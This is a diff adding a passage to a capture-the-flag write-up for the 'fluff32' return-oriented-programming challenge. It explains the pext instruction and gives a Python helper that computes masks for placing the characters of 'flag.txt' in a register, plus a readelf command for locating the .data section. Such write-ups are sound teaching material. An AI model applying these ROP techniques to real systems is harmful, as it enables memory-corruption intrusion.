@@ -58,7 +58,46 @@ search /1/ pop ebp
 ```
 ![](./5.png)
 
+Perfect, we have everything in terms of gadgets, and we can exit ropper (with the command `quit`). Still, there’s one question left: what will be the value of `ebp` when we use the gadget that performs `pext`?
 
+To answer this question, we need to learn about the [`pext`](https://www.felixcloutier.com/x86/pext) operation and write an 'oposite' algorithm that, given a desired output from `pext` (One of the characters in the string "flag.txt" in our case) and a value (`0xb0bababa` in this case), generates a mask. This algorithm is very simple, and I've written it in Python. All it does is iterate simultaneously over the bits of the value and the desired output, and when they match, it adds 1 to the mask; otherwise, it adds 0 and continues with the value in search of the next bit that matches the desired output.
+
+```python
+def get_mask(target, value=0xb0bababa):
+    target_bits = bin(ord(target))[2:]
+    value_bits  = bin(value)[2:]
+    mask_bits   = ''
+    
+    while(target_bits):
+        if target_bits[-1] == value_bits[-1]:
+            mask_bits = '1' + mask_bits
+            target_bits = target_bits[:-1]
+        else:
+            mask_bits = '0' + mask_bits
+        value_bits = value_bits[:-1]
+    
+    while(value_bits):
+        if value_bits[-1] == '0':
+            mask_bits = '1' + mask_bits
+        else:
+            mask_bits = '0' + mask_bits
+        value_bits = value_bits[:-1]
+    
+    return int(mask_bits, 2)
+
+# get_mask("f") == 0x4f454b4b
+# It means,
+#     pext edx, 0xb0bababa, 0x4f454b4b
+# Causes the binary value of `f` to be stored in `edx` (edx = 0x00000066)
+```
+
+The second loop in the algorithm aims to also add the other 0s present in the value being processed, because we want to achieve a 4-byte output without a null byte.
+
+We will use the same memory area of the data section to ultimately store the entire string "flag.txt."
+
+```
+readelf -S fluff32 | grep -e '[.]data'
+```
 
 ## Solution
 In the following table, the important addresses for constructing the ROP chain are summarized, along with a brief description of each.
